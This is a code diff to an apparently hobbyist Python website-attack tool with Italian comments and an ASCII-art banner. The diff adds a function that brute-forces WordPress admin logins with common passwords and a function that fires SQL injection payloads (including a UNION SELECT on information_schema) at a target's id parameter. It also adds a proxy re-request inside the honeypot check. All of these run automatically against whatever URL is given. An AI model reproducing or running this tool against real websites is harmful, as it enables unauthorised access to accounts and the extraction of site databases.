@@ -9,6 +9,8 @@ from bs4 import BeautifulSoup, Comment
 from scapy.all import sr1, IP, ICMP
 from socket import gethostbyname, gethostbyaddr
 import json
+from itertools import product
+from string import ascii_letters, digits
 
 def pulisci_schermo():
     """Pulisce lo schermo del terminale."""
@@ -22,18 +24,16 @@ def display_ascii_art():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣷⡀⠙⣿⣷⣌⠻⣿⣿⣿⣶⣌⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠈⢿⣿⡆⠹⣿⣿⣿⣿⣷⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠹⣿⡄⢻⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⣽⣷⢸⣿⡿⣿⡿⠿⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠐⠾⢭⣭⡼⠟⠃⣤⡆⠘⢟⢺⣦⡀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣯⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠉⠙⠒⠂⠀⠀⠀⠀⠀⣤⣤⣄⠀⠉⠛⠿⠁⠀⠀⠀⠀⠀
-⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⢶⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀
-⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠛⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⣽⣷⢸⣿⡿⣿⡿⠿⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠐⠾⢭⣭⡼⠟⠃⣤⡆⠘⢟⢺⣦⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
+⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠀⠀⠀
                 
 by hagg4r""")
 
@@ -71,6 +71,9 @@ def find_admin_page(url):
 
             # Simula il salvataggio del database in un file di testo
             save_database_to_txt(url)
+
+            # Tentativo di brute force
+            brute_force_admin(url)
         else:
             print("Pagina Admin non trovata.")
     except Exception as e:
@@ -91,8 +94,22 @@ def save_database_to_txt(url):
     except Exception as e:
         print(f"Errore durante il salvataggio del database: {e}")
 
+def brute_force_admin(url):
+    """Esegue il brute force delle credenziali di accesso admin"""
+    username = "admin"
+    passwords = ['admin', 'password123', '123456', 'admin123']  # Esempi di password comuni
+    headers = {"User-Agent": "Mozilla/5.0"}
+
+    for password in passwords:
+        response = requests.post(f"http://{url}/wp-login.php", data={'log': username, 'pwd': password}, headers=headers, timeout=10)
+        if "dashboard" in response.url:
+            print(f"Brute force riuscito con username: {username} e password: {password}")
+            break
+        else:
+            print(f"Tentativo fallito con password: {password}")
+
 def scan_for_errors(url):
-    """Scansiona il sito per errori comuni e debolezze di sicurezza"""
+    """Scansiona il sito web per errori e debolezze di sicurezza"""
     error_patterns = [
         "404 Not Found", "500 Internal Server Error", "403 Forbidden",
         "SQL syntax", "Error establishing a database connection", "PHP Warning"
@@ -173,10 +190,39 @@ def check_honeypot(url):
         for pattern in honeypot_patterns:
             if pattern in page_content.lower():
                 print(f"Sito potenzialmente un honeypot: trovato '{pattern}'")
+                
+                # Utilizza un proxy per le richieste
+                proxy = {
+                    "http": "http://127.0.0.1:8080",
+                    "https": "http://127.0.0.1:8080"
+                }
+                proxy_response = requests.get(f"http://{url}", headers=headers, proxies=proxy, timeout=10)
+                print("\nRisposta tramite proxy:")
+                print(proxy_response.status_code)
                 return
         print("Sito non sembra essere un honeypot.")
     except Exception as e:
         print(f"Errore durante la verifica del honeypot: {e}")
+
+def sql_injection(url):
+    """Tentativo di SQL Injection per estrarre dati"""
+    payloads = [
+        "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null, table_name FROM information_schema.tables --"
+    ]
+    headers = {"User-Agent": "Mozilla/5.0"}
+
+    for payload in payloads:
+        try:
+            response = requests.get(f"http://{url}?id={payload}", headers=headers, timeout=10)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Trova le informazioni SQL in risposta
+            for tag in soup.find_all():
+                if payload in tag.text:
+                    print(f"\nRisultato SQL Injection con payload '{payload}':")
+                    print(tag.text)
+        except Exception as e:
+            print(f"Errore durante l'SQL Injection: {e}")
 
 def main():
     pulisci_schermo()
@@ -206,6 +252,9 @@ def main():
     
     print("\nVerifica se il sito è un honeypot...")
     check_honeypot(url)
+    
+    print("\nTentativo di SQL Injection...")
+    sql_injection(url)
     
 if __name__ == "__main__":
     main()
